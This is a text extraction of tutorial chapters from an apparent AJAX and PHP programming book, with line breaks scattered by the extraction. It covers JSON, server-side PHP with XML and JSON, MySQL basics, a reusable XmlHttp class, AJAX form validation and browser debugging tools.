Larger Text,Smaller Text,Symbol
JSON concepts,"JSON is said to be a subset of JavaScript because it's based on the associative array 
 (key/value or dictionary) nature of JavaScript objects—remember, at the beginning of 
 this chapter, you learned that every JavaScript object is a dictionary!
  
 JSON is based on two basic structures:
  
 •
  
 •
  
 Object
 : This is defined as a collection of name/value pairs. Each object begins 
 with a left curly bracket (
 {
 ) and ends with a right curly bracket (
 }
 ). A colon 
 separates the name/value pairs (
 name:value)
 .
  
 Array
 : This is defined as a list of values separated by a comma (
 ,
 ). The array 
 begins with a left square bracket (
 [
 ) and ends with a right square bracket (
 ]
 ).
  
 We should also mention strings and values. A 
 value
  can be a string, a number, an 
 object, an array, true or false, or null. A 
 string
  is a collection of Unicode characters 
 surrounded by double quotes. For escaping, we use the backslash '
 \
 ' character.
  
 It's obvious that if you plan to use JSON, you need to be able to parse and generate JSON 
 structures in both JavaScript and PHP—at least if communication is 
  
 bidirectional. JSON libraries are available for most of today's programming languages. 
  
 In the exercise that follows, you'll see how to read JSON data using JavaScript, and 
 later in the book, you'll learn how to create JSON structures with PHP.
  
 If you plan to work with JSON data outside of PHP, you can use the library listed at 
 http://www.json.org/js.html
 . Here you can also find an excellent visual 
 description of what JSON structures are made of.",NA
A simple JSON example,"We'll conclude this chapter by translating the XML example from Chapter 2, which was 
 created using XML, to use JSON. In Chapter 2, 
 JavaScript and the AJAX Client
 , we used three 
 files: 
 books.html
 , 
 books.js
 , and 
 books.html
  (if you can't recall the exercise, have a 
 look at the screenshot in the 
 Time for action—making asynchronous calls with 
 XMLHttpRequest and XML
  section of Chapter 2). 
  
 In this new exercise, the file we're reading from the server is named 
 books.txt
  and it is 
 the JSON equivalent of 
 books.xml
  from Chapter 2.
  
 Let's see how to read this structure using JavaScript code and show the list of books to 
 our visitor.
  
 [
  109 
 ]",NA
Time for action – using JSON ,"1. In the 
 oop
  folder, create a subfolder called 
 json
 .
  
 2. In the 
 json
  folder, create a file called 
 books.txt
 , and add the structure 
  
 content to the file:
  
 {books:[
  
  {title:""AJAX and PHP: Building Modern Web Applications, 2nd Ed"",
  
  isbn:""978-1904817726""},
  
  {title:""Beginning PHP and MySQL E-Commerce, 2nd Edition"",
  
  
  isbn:""978-1590598641""},
  
  {title:""Professional Search Engine Optimization with PHP"",
  
  
 isbn:""978-0470100929""} 
  
 ]}
  
 3. In the same folder, create a file called 
 books.html
 , where you should copy 
  
 the contents of 
 books.html
  from Chapter 2. (Remember you can also use the 
  
 code download.) 
  
 4. Finally, create the 
 books.js
  file, which is, again, mostly the same as the one 
  
 from Chapter 2. The differences from the Chapter 2 version are highlighted: 
  
 // holds an instance of XMLHttpRequest 
  
  
 var xmlHttp = createXmlHttpRequestObject(); 
  
  
 // creates an XMLHttpRequest instance 
  
  
 function createXmlHttpRequestObject() 
  
  
 { 
  
  
 // ... same old function 
  
  
 } 
  
  
 // read a file from the server 
  
  
 function process() 
  
  
 {
  
  
  
  // only continue if xmlHttp isn't void
  
  
  
  if (xmlHttp)
  
  
  
  {
  
  
  
  // try to connect to the server
  
  
  
  try
  
  
  
  {
  
 [
  110 
 ]",NA
Summary,"In this chapter, we covered a large area of what object-oriented programming means in 
 the world of JavaScript, starting from basic features and going far into the execution 
 context of functions. Working with OOP in JavaScript is certainly no easy task, especially 
 if you haven't been exposed to the implied concepts previously. Where you don't feel 
 confident enough, have a look at the additional resources that we've referenced.
  
 [
  112 
 ]",NA
Using PHP and MySQL on ,NA,NA
the Server,"AJAX is mainly about building smart web clients, but the servers that the client talks to 
 must be equally smart or their conversation will be quite one-sided. 
  
 So far, we've only talked about clients reading static text, JSON, or XML files from the 
 server. In this chapter, we start putting the server to work, using PHP to generate 
 dynamic output, and MySQL to manipulate and store the backend data. In this chapter, 
 you will learn how to:
  
 •
  
 •
  
 •
  
 Use XML and JSON with PHP, so that you can create server-side code that 
 communicates with your JavaScript client 
  
 Implement error-handling code in your server-side PHP code 
  
 Work with MySQL databases",NA
"PHP, DOM, and XML","To begin understanding the server-side techniques and principles used in AJAX, in the 
 first exercise of this chapter, you'll create a PHP script that uses PHP's DOM functions 
 to dynamically create XML output, which is then read by the client.
  
 Remember that we assume you have basic knowledge of PHP. If you need additional 
 assistance with the PHP code, we recommend you google ""php tutorial"", which will lead 
 you to lots of interesting resources, including the official PHP tutorial at 
 http://php.net/tut.php
 . If you enjoy learning by practice, check out Cristian Darie's 
 PHP e-commerce books, such as 
 Beginning PHP and MySQL E-Commerce: From Novice to 
 Professional, Second Edition
 .",NA
Time for action – server-side AJAX with PHP and XML ,"1. In the 
 ajax
  folder, create a subfolder called 
 php
 .
  
 2. In the 
 php
  folder, create a file named 
 phptest.html
 , and add the following 
  
 text in it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
 [
  114 
 ]",NA
What just happened?,"When it comes to generating XML structures, not only on the client side but on the 
 server side as well, you have to choose between creating the XML document using the 
 DOM, or by joining strings. Your PHP script, 
 phptest.php
 , starts by setting the content 
 output to 
 text/xml
 :
  
 <?php
  
 // set the output content type as xml
  
 header('Content-Type: text/xml');
  
 If you want more familiarity with PHP headers, the documentation can be found at 
 http://www.php.net/manual/en/function.header.php
 .
  
  
 In JavaScript files we use double quotes for strings, in PHP we will always 
  
  
 try to use single quotes. They are processed faster, are more secure and 
  
 they are less likely to cause programming errors. Learn more about PHP 
  
 strings at 
 http://php.net/types.string
 .
  
 The PHP DOM, not very surprisingly, looks a lot like the JavaScript DOM (isn't that 
 handy?). It all begins by creating a DOM document object, which in PHP is 
 represented by the 
 DOMDocument
  class:
  
 // create the new XML document
  
 $dom = new DOMDocument();
  
 [
  118 
 ]",NA
PHP and JSON ,"In the previous chapter, we only scratched the surface of JSON. As we've previously 
 seen, using JSON reduces the amount of data sent through the wire—so it's certainly 
 worth learning and utilizing. You probably remember that JSON's format isn't that 
 different from XML's. Take a look at obtaining the same result as above, using JSON:
  
 [""response"":
  
  
  {""books"":
  
  
  [    
  
     
  {""title"":""AJAX and PHP: Building Modern Web Applications,  
       
  2nd Ed"",
  
      
  ""isbn"":""978-1904817726""
  
   
  }    
  
 [
  119 
 ]",NA
Time for action – server-side AJAX with PHP and JSON,"1. Download 
 http://www.json.org/json2.js
  to your 
 ajax/php
  folder.
  
 2. Edit the 
 phptest.html
  file that you've created earlier by adding a reference 
  
 to 
 json2.js
 :
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www. 
 w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  <head>
  
  <title>AJAX Foundations: Using JSON with PHP</title>
  
  <script type=""text/javascript"" src=""phptest.js""></script>
  
  <script type=""text/javascript"" src=""json2.js""></script>
  
 [
  120 
 ]",NA
What just happened?,"Modifying the code in order to use JSON was blissfully easy, wasn't it? We had to 
 reference the JavaScript JSON library in order to be able to work with it properly.
  
  <script type=""text/javascript"" src=""json2.js""></script>
  
  
 We might have just used 
 eval()
  to get the object from the XMLHttp 
  
  
 response, as we did in the final exercise of Chapter 3, but that would have 
  
 possibly lead to security issues. For more information about the security 
  
 issues with 
 eval()
 , you can check 
 http://www.json.org/js.html
 .
  
 The server-side code now looks simpler too. We simply structure the information we 
 want to send using arrays, and then we use the 
 json_encode()
  function to generate the 
 JSON string. The 
 encode
  and 
 decode
  methods allow us to encode a PHP object into JSON 
 format and to decode a JSON string into a PHP object.
  
 The JavaScript used for parsing the data has also been simplified. Using the JSON 
 library, we parse the response from the server and generate the JSON object.
  
  // read the message from the server
  
  responseJSON = JSON.parse(xmlHttp.responseText);   
  
 [
  122 
 ]",NA
Passing parameters and handling PHP ,NA,NA
errors,"The previous exercise with PHP ignores two very common aspects of writing PHP 
 scripts: 
  
 •
  
 •
  
 You usually need to send parameters to your server-side (PHP) script. The client 
 side is quite well protected, but we need to implement some error-handling on 
 the server side as well.
  
 You can send parameters to the PHP script using either 
 GET
  or 
 POST
 . Handling PHP 
 errors is done with a PHP-specific technique. In the following exercise, you will pass 
 parameters to a PHP script, and implement an error-handling mechanism that you will 
 test by supplying bogus values. The application will look as shown in the screenshot that 
 will follow shortly.
  
 The page will make an asynchronous call to a server to divide two numbers. The 
 server, when everything works well, will return the result as an XML structure that 
 looks like this:
  
 <?xml version=""1.0""?>
  
 <response>1.5</response>
  
 In the case of a PHP error, the server script returns a plain text error message (instead of 
 generating an XML string). Because few things are as annoying or less helpful as 
 indecipherable, geeky error messages, ours will be intercepted by the client so we can 
 have a chance to change it into a friendly, easy-to-understand message. 
  
 [
  123 
 ]",NA
Time for action – passing PHP parameters and ,NA,NA
error handling ,"1. In the 
 ajax/php
  folder, create a new folder called 
 errhandling
 .
  
 2. In the 
 errhandling
  folder, create a file named 
 divide.html
  and type the 
 following code in it (don't worry if all the code isn't clear just yet, we'll be 
 taking a good look at it in a moment):
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.
  
 w3.org/TR/xhtml11/DTD/xhtml11.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  
  <head>
  
  
  <title> 
  
    
  Practical AJAX: PHP Parameters and Error Handling 
  
  
 </title>
  
  
  <script type=""text/javascript"" src=""divide.js""></script>
  
  
 </head>
  
  
  <body>
  
  
  <p>Ask server to divide
  
    
  <input type=""text"" id=""firstNumber"" />
  
    
  by
  
    
  <input type=""text"" id=""secondNumber"" />
  
    
  <input type=""button"" value=""Send"" onclick=""process()"" />
  
  </p>
  
  
  <div id=""myDivElement"" />
  
  
  </body> 
  
 </html>
  
 3. Create a new file named 
 divide.js
 . For brevity we're not including the usual 
 functions you've already seen numerous times already—please take them from 
 other exercises (the template is 
 async.js
  from Chapter 2), or from the code 
 download. 
  
 // holds an instance of XMLHttpRequest 
  
 var xmlHttp = createXmlHttpRequestObject();
  
 // creates an XMLHttpRequest instance 
  
 function createXmlHttpRequestObject() 
  
 {
  
  
  // ... take from code download 
  
 } 
  
 // initiates a server request to send the numbers typed by the 
 user 
  
 [
  124 
 ]",NA
What just happened?,"You must be familiar with all the code on the client side by now, except the error-
 handling code in 
 handleServerResponse()
 . On the server-side, we also have 
 some code to analyze: 
 divide.php
  and 
 error_handler.php
 .
  
 divide.php
  
 The 
 divide.php
  script has a simple mission: it is expected to output the result of the 
 division of the numbers it receives as parameters in the form of a simple XML 
 structure, such as:
  
 <response>2.5</response>
  
 The script starts by loading the error-handling routine:
  
 <?php
  
 // load the error handling module
  
 require_once('error_handler.php');
  
 This file contains generic error-catching code which executes whenever an error 
 happens in your code. In our particular example, we're expected to receive errors 
 when the ""numbers"" supplied as parameters aren't numbers, or if we try to do a 
 division by 0.
  
 [
  128 
 ]",NA
Working with MySQL,"The next logical step is to do ""work"" on stored data. Perhaps you will need to create a 
 mailing list, or calculate the number of entries that match certain criteria, or generate a 
 customer's order history. A backend data store is necessary when you implement almost 
 any kind of application that is expected to generate some useful dynamic output. The 
 most common way to store data is by using 
 Relational Database Management Systems
  
 (
 RDBMS
 )—very powerful tools that store and manage data.
  
 Much like the other ingredients, the database is not a part of AJAX, but it's not likely that 
 you'll be able to build real-world web applications without a database to support them. 
 In this book, we'll present simple applications that don't have impressive data needs, 
 but require a database nonetheless. We've chosen (like so many thousands of others) to 
 use MySQL, which is a very popular, powerful, and reliable database. In addition, its 
 functionality is very generic, so it can be  ported to other database systems with very 
 little effort.
  
 To build an application that uses databases you need to know the basics of:
  
 1. Creating database tables that hold your data.
  
 2. Writing SQL queries to manipulate that data.
  
 3. Connecting to your MySQL database using PHP code.
  
 4. Sending SQL queries to the database, and retrieving the results.
  
  
 Once again, we'll only be able to cover the very basics of working with 
  
  
 PHP and MySQL databases here. The free online manuals of PHP and 
  
 MySQL are quite well written; you will certainly find them useful along 
  
 the way.
  
 [
  134 
 ]",NA
Creating database tables,"To create a data table, you need to know the basic concepts of the structure of a 
 relational database. A data table is made up of columns (
 fields
 ), and rows (
 records
 ). 
  
 When creating a data table, you need to define its fields, which can have various 
 properties. Here we will discuss:
  
 •
  
 Primary Keys
  
 •
  
 Data types
  
 •
  
 NULL and NOT NULL columns
  
 •
  
 Default column values
  
 •
  
 auto_increment
  columns
  
 •
  
 Indexes
  
 The 
 Primary Key
  is a special column (or a set of columns) in a table that makes each 
 row uniquely identifiable. The Primary Key column doesn't allow repeating values, so 
 every value will be unique. When the Primary Key is formed of more than one column, 
 the set of columns must be unique. 
  
 How about an easy example? Let's say you had a table with two columns (fields) ""first 
 name"" and ""phone number"". In most cases, you would find several people with the same 
 first name; in other words, in the ""first name"" column you would find several rows that 
 had the name ""Dave"", for example. You couldn't really use the ""first name"" column as your 
 primary key but ""phone number""… now there's a possibility! 
  
 Usually the ""phone number"" column won't have any values repeated in its rows, after 
 all, phone numbers are unique! You could reasonably decide to use the ""phone number"" 
 as your primary key. ""But wait,"" you say, ""my spouse and I both have the same phone 
 number!"" In that case, we need to set the primary key to look at 
 both 
 ""first name"" and 
 ""phone number"" together because their combination will always produce unique values.
  
 Technically, 
 PRIMARYKEY
  is a constraint (a rule) that you apply to a column, but for 
 convenience, when saying ""primary key"", we usually refer to the column that has the 
 PRIMARYKEY
  constraint. When creating a 
 PRIMARYKEY
  constraint, a unique index is also 
 created on that column, significantly improving searching performance. 
  
 Each column has a 
 data type
 , which describes its size and behavior. There are three 
 important categories of data types (
 numerical types
 , 
 character and string types
 , and 
 date 
 and time types
 ), and each category contains many data types. For complete details on 
 this subject, refer to the official MySQL 5 documentation at 
 http://dev.mysql.com/ 
 doc/refman/5.0/en/data-types.html
 . 
  
 [
  135 
 ]",NA
Manipulating data,"You can manipulate your data using SQL's 
 Data Manipulation Language
  (
 DML
 ) 
 commands, 
 SELECT
 , 
 UPDATE
 , and 
 DELETE
 , used to retrieve, add, modify, and delete 
 records from data tables. These commands are very powerful, and flexible. Their basic 
 syntax is:
  
 SELECT <column list>
  
 FROM <table name(s)>
  
 [WHERE <restrictive condition(s)>]
  
 INSERT INTO <table name> [(column list)] 
  
 VALUES (column values)
  
 [
  137 
 ]",NA
Connecting to your database and executing ,NA,NA
queries,"In our examples, the code that connects to the database will be written in PHP. As Figure 
 4-9 shows, the database will never be accessed directly by the client, but only by the 
 business logic written in the PHP code on the server:
  
  
 user
  
 web client
  
 client requests a 
 .PHP resource
  
 Apache
  
 the PHP script
  
 MySQL
  
 after PHP script finishes 
 execution, the results 
  
 (HTML, JavaScript) are 
 sent back to the client
  
 reads data from
  
 the database
  
 web server
  
 Figure 4-9: User connecting to MySQL through layers of functionality
  
 To get to the necessary data, your PHP code will need to authenticate to the database. 
  
 Database security—as with any other kind of security system—involves two important 
 concepts: 
 authentication
  and 
 authorization
 . Authentication is the process in which the 
 user is uniquely identified using some sort of login mechanism (usually by entering a 
 username and password). Authorization refers to the resources that can be accessed 
 (and actions that can be performed) by the authenticated user. 
  
 If you configured MySQL security as shown in the Appendix, you will connect to your 
 local MySQL server, to the database called 
 ajax
 , as a user called 
 ajaxuser
 , with the 
 password 
 practical
 . These details will be kept in a configuration file called 
 config.php
 , which can be easily updated when necessary. The 
 config.php
  script 
 will look like this:
  
 <?
  
 // defines database connection data
  
 define('DB_HOST', 'localhost');
  
 define('DB_USER', 'ajaxuser');
  
 define('DB_PASSWORD', 'practical');
  
 define('DB_DATABASE', 'ajax'); 
  
 ?>
  
 [
  139 
 ]",NA
Time for action – working with PHP and MySQL ,"1. Connect to the 
 ajax
  database using phpMyAdmin, and create a table named 
  
  
 users
  with the following code:
  
 CREATE TABLE users 
  
 (
  
  user_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
 [
  140 
 ]",NA
What just happened?,"First of all, note that there is no AJAX going on here; the example is demonstrating plain 
 PHP data-access functionality. All the interesting things happen in 
 index.php
 . The real 
 functionality starts by loading the error handler, and the configuration scripts:
  
 <?php
  
 // load configuration file
  
 require_once('error_handler.php');
  
 require_once('config.php');
  
 Then, just as mentioned, we create a new database connection:
  
 // connect to the database
  
 $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_DATABASE); 
  
 Note that a database connection contains a reference to a specific database inside the 
 database server, not to the database server itself. The database we connect to is 
 ajax
 , 
 which contains the 
 users
  table that you created earlier. When performing queries on the 
 created connection, you can count on having access to the 
 users
  table: 
  
 // the SQL query to execute
  
 $query = 'SELECT user_id, user_name FROM users'; 
  
 // execute the query
  
 $result = $mysqli->query($query); 
  
 [
  143 
 ]",NA
Summary,"Hopefully, you have enjoyed the little examples in this chapter because many more will 
 follow! This chapter walked you through the technologies that live at the server side of a 
 typical AJAX application. We did a few exercises that involved simple server 
 functionality, and PHP did a wonderful job at delivering that functionality. 
  
 You also learned the basics of working with databases, and simple database 
 operations with the first table created in this book.
  
 In the following chapters, you'll meet even more interesting examples that use 
 more advanced code to implement their functionality. In Chapter 5, 
 AJAX Form 
 Validation
 , you'll build an AJAX-enabled form validation page, which is safe to work 
 with even if the client doesn't support JavaScript and AJAX.
  
 [
  144 
 ]",NA
AJAX Form Validation,"Input data validation is an essential feature for any modern software application. In 
 the case of web applications, validation is an even more sensitive area because your 
 application is widely reachable by many users with varying skill sets (and 
 intentions).
  
 Validation is not something that you can play with—invalid data has the potential to 
 harm the application's functionality, result in errant and inaccurate reporting, and even 
 corrupt the application's most sensitive area—the database.
  
 Validating data requires checking whether the data entered by the user complies with 
 rules established in accordance with the business rules of your application 
 before 
 allowing it to be used. For example, if dates must be entered in the YYYY-MM-DD format, 
 then a date of February 28 would be invalid. Email addresses and phone numbers are 
 other examples of data that should be checked against valid formats. 
  
 In addition, validation must guard against ""SQL injection""—which could corrupt, 
 control, and/or access your data and database.
  
  
 The importance of carefully defining input data validation rules 
  
  
 and consistently applying those rules cannot be overstated!",NA
Implementing AJAX form validation,"The form validation application we will build in this chapter validates the form at the 
 server side on the classic form submit, implementing AJAX validation while the user 
 navigates through the form. The final validation is performed at the server, as shown in 
 Figure 5-1:
  
 [
  146 
 ]",NA
"XMLHttpRequest, version 2","As in this book we do our best to combine theory and practice, before moving on to 
 implementing the AJAX form validation script, we'll have another quick look at our 
 favorite AJAX object—
 XMLHttpRequest
 .
  
 On this occasion, we will step up the complexity (and functionality) a bit and use 
 everything we have learned until now. We will continue to build on what has come before 
 as we move on; so again, it's important that you take the time to be sure you've 
 understood what we are doing here. Time spent on digging into the materials really pays 
 off when you begin to build your own application in the real world.
  
 In Chapter 2, we took a sneak peak at the 
 XMLHttpRequest
  object—the nexus of the 
 AJAX world. Back then, we didn't have any OOP JavaScript skills. We've seen the power 
 hidden in JavaScript in Chapter 3. In Chapter 4, we saw how PHP works together with 
 AJAX requests.
  
 Our OOP JavaScript skills will be put to work improving the existing script that used to 
 make AJAX requests. In addition to the design that we've already discussed, we're 
 creating the following features as well:
  
 •
  
 •
  
 Flexible design so that the object can be easily extended for future needs 
 and purposes
  
 The ability to set all the required properties via a JSON object
  
 We'll package this improved 
 XMLHttpRequest
  functionality in a class named 
 XmlHttp
  
 that we'll be able to use in other exercises as well. You can see the class diagram in the 
 following screenshot, along with the diagrams of two helper classes:
  
 •
  
 •
  
 settings
  is the class we use to create the call settings; we supply an instance of 
 this class as a parameter to the constructor of 
 XmlHttp
  
 complete
  is a callback delegate, pointing to the function we want executed 
 when the call completes
  
 [
  150 
 ]",NA
Time for action – the XmlHttp object ,"1. In the 
 ajax
  folder, create a folder named 
 validate
 , which will host the 
  
  
 exercises in this chapter.
  
 2. In the 
 validate
  folder, create a new file named 
 xhr.js
  and add the 
  
 following code to it:
  
 // XmlHttp constructor can receive request settings: 
  
 // url - the server url 
  
 // contentType - request content type 
  
 // type - request type (default is GET) 
  
 // data - optional request parameters 
  
 // async - whether the request is asynchronous (default is 
 true) // showErrors - display errors 
  
 // complete - the callback function to call when the request // 
 completes 
  
 function XmlHttp(settings)
  
 [
  151 
 ]",NA
What just happened?,"The code listed above contains significant code from the previous examples and then 
 some new code. Let's break it down into small pieces and analyze it.
  
 The chosen name for our reusable object is 
 XmlHttp
 . Its functionality is wrapped in 
 two functions:
  
 •
  
 •
  
 XmlHttp.create()
 : A static method of the 
 XmlHttp
  object that creates a 
 XmlHttpRequest
  object
  
 XmlHttp()
 : The constructor of the 
 XmlHttp
  object
  
 From a design point of view, the 
 XmlHttp
  object represents a wrapper around the 
 XmlHttpRequest
  object. The 
 XmlHttp.create()
  method contains the same code that 
 we have previously seen in the 
 createXmlHttpRequestObject()
  method. It simply acts 
 like a factory for an 
 XmlHttpRequest
  object.
  
 The constructor of the 
 XmlHttp
  object, although it can look quite scary at first sight, 
 actually contains very simple code—provided that you know the theory from Chapter 3, 
 Object Oriented JavaScript
 . The constructor receives as a parameter a JSON object 
 containing all the settings for the 
 XmlHttp
  object. Choosing a JSON object is both 
 convenient from the extensibility point of view and easy from the programming point of 
 view. We store the settings in a property with the same name.
  
 function XmlHttp(settings)
  
 {
  
  // store the settings object in a class property
  
  this.settings = settings;
  
 [
  156 
 ]",NA
AJAX form validation,"In the previous chapter, we talked about error handling and database operations. In this 
 chapter, we redesigned the code for making AJAX requests when creating the 
 XmlHttp
  
 class. The AJAX form validation application makes use of these techniques. 
  
 The application contains three pages:
  
 •
  
 One page renders the form to be validated
  
 •
  
 Another page validates the input
  
 •
  
 The third page is displayed if the validation is successful
  
 The application will have a standard structure, composed of these files:
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 •
  
 index.php
 : It is the file loaded initially by the user. It contains references to 
 the necessary JavaScript files and makes asynchronous requests for 
 validation to 
 validate.php
 .
  
 index_top.php
 : It is a helper file loaded by 
 index.php
  and contains several 
 objects for rendering the HTML form.
  
 validate.css
 : It is the file containing the CSS styles for the application.
  
 json2.js
 : It is the JavaScript file used for handling JSON objects.
  
 xhr.js
 : It is the JavaScript file that contains our 
 XmlHttp
  object used for 
 making AJAX requests.
  
 validate.js
 : It is the JavaScript file loaded together with 
 index.php 
 on 
 the client side. It makes asynchronous requests to a PHP script called 
 validate.php
  to perform the AJAX validation.
  
 validate.php
 : It is a PHP script residing on the same server as 
 index.php
 , 
 and it offers the server-side functionality requested asynchronously by the 
 JavaScript code in 
 index.php
 .
  
 validate.class.php
 : It is a PHP script that contains a class called 
 Validate
 , which contains the business logic and database operations to 
 support the functionality of 
 validate.php
 .
  
 config.php
 : It will be used to store global configuration options for your 
 application, such as database connection data, and so on.
  
 error_handler.php
 : It contains the error-handling mechanism that changes 
 the text of an error message into a human-readable format.
  
 allok.php
 : It is the page to be displayed if the validation is successful.
  
 Bearing all this in mind, it's time to get to work!
  
 [
  159 
 ]",NA
Time for action – AJAX form validation ,"1. If you missed the database exercise in Chapter 4, 
 Using PHP and MySQL on 
  
  
 the Server
 , connect to the 
 ajax
  database and create a table named 
 users
  with 
  
  
 the following code; otherwise, skip to step 3.
  
 CREATE TABLE users 
  
 (
  
  user_id INT UNSIGNED NOT NULL AUTO_INCREMENT, 
 user_name VARCHAR(32) NOT NULL,
  
  PRIMARY KEY (user_id) 
  
 );
  
 2. Execute the following 
 INSERT
  commands to populate your 
 users
  table with some 
 sample data: 
  
 INSERT INTO users (user_name) VALUES ('bogdan'); 
  
 INSERT INTO users (user_name) VALUES ('audra'); 
  
 INSERT INTO users (user_name) VALUES ('cristian');
  
 3. Let's start writing the code with the presentation tier. We'll define the styles for 
 our form by creating a file named 
 validate.css
 , and adding the following 
 code to it:
  
 body 
  
 {
  
  
  font-family: Arial, Helvetica, sans-
 serif;
  
  font-size: 0.8em;
  
  
  color: #000000; 
  
 }
  
 label 
  
 {
  
  
  float: left;
  
  
  width: 150px;
  
  
  font-weight: 
 bold; 
  
 }
  
 input, select 
  
 {
  
  
  margin-bottom: 3px; 
  
 }
  
 .button 
  
 {
  
  
  font-size: 2em; 
  
 }
  
 [
  160 
 ]",NA
What just happened?,"The AJAX validation technique allows us to validate form fields and at the same time 
 inform users if there were any validation errors, and the icing on the cake is that we are 
 doing it without interrupting the user's activity!
  
 The client-side validation is combined with a pure server-side PHP validation that 
 takes place when the user clicks on 
 Submit
  and thereby submits the entire form to the 
 server. Because of two PHP scripts, 
 validate.php
  and 
 validate.class.php
 , both 
 validation types are supported at the server.
  
 [
  176 
 ]",NA
Summary,"We saw how to put into practice everything that we had learned so far in JavaScript by 
 building our own flexible, extensible, reusable object for AJAX requests. We 
 demonstrated the application structure that we specified as well.
  
 Our intention here wasn't to build the perfect validation technique but, rather, a 
 working proof of the concept that takes care of user input and ensures its validity.
  
 This validation technique isn't possible with JavaScript alone, nor would you want to wait 
 for the fields to be validated only on form submit.
  
 Now that we've finished a complete, quite complex case study, it's time to have a quick 
 look at some useful tools that we can use to debug and profile our AJAX code.
  
 [
  182 
 ]",NA
Debugging and Profiling ,NA,NA
AJAX Applications,"Throughout the lifetime of a software product, there is at least one phase of testing the 
 code. The first iteration of software that most programmers write (the authors of this 
 book included) usually has room for improvement. The investigation of software's 
 behavior during execution, by gathering data with the goal to 
  
 identify its weaknesses and improve them, is known as 
 profiling
  or 
 performance 
 analysis
 . Normally, pointing out of mistakes, critiques, or suggestions of areas for 
 improvement induces cringing. Not so with testing—this is your chance to ""get the bugs 
 out"" and/or improve performance before your public regretfully experiences any ""room 
 for improvement"". It is the opportunity to earnestly seek out any weaknesses or less-
 than-ideal happenings and avoid their discovery (usually by surprise) when it may be 
 too late to readily fix the problem without a major rework of your design.
  
 No matter what technology or platform you choose, you'll find many tools on the 
 market to help you test, debug, and objectively gauge the performance of your 
 application. There are some great tools that will make your life easier when writing 
 and debugging AJAX applications. In this chapter, we're going to delve into the 
 following:
  
 •
  
 •
  
 •
  
 Learn how to enable and use Internet Explorer's debugging capabilities Work 
 with Web Development Helper, Developer Toolbar, and other Internet Explorer 
 tools 
  
 Work with Firefox plugins such as Firebug, Venkman JavaScript Debugger, and 
 Web Developer",NA
Debugging and profiling with Internet ,NA,NA
Explorer,"Here you'll learn how to:
  
 •
  
 Enable debugging in Internet Explorer 6 and 7
  
 •
  
 Use the Developer Tools application in Internet Explorer 8
  
 •
  
 Work with Firebug, Internet Explorer Developer Toolbar, and other tools",NA
Enabling debugging in Internet Explorer 6 ,NA,NA
and 7,"When you need to debug JavaScript code with Internet Explorer, we recommend 
  
 you use Internet Explorer 8 (or later), because of its integrated Developer Tools 
  
 application. However, if you need to use Internet Explorer 7 or older, here's how.
  
 In Internet Explorer 7 and its lower versions, there is no integrated JavaScript 
  
 debugger support. By default, JavaScript errors are ignored by Internet Explorer. 
  
 So in order to be able to debug in Internet Explorer, you need to:
  
 •
  
 Start Internet Explorer and go to 
 Tools | Internet Options | Advanced 
 and 
 deselect the 
 Disable script debugging (Internet Explorer)
  and 
 Disable script 
 debugging (Other)
  checkboxes. If you want a pop-up window to be displayed 
 for each error, you need to deselect the 
 Display a notification about every 
 script error
  checkbox, as shown in Figure 6-1:
  
 [
  184 
 ]",NA
Debugging in Internet Explorer 8,"Internet Explorer 8 makes things easier for you because it doesn't require third-party 
 tools or utilities for debugging and profiling—instead, it includes an application called 
 Developer Tools
 , which is easily accessible via the 
 Shift+F12
  shortcut keys or by 
 clicking on the 
 DeveloperTools
  icon. Figure 6-3 shows the main 
 www.bing.com 
 page 
 opened for debugging with Developer Tools:
  
  
 Figure 6-3: Debugging using Developer Tools
  
 [
  186 
 ]",NA
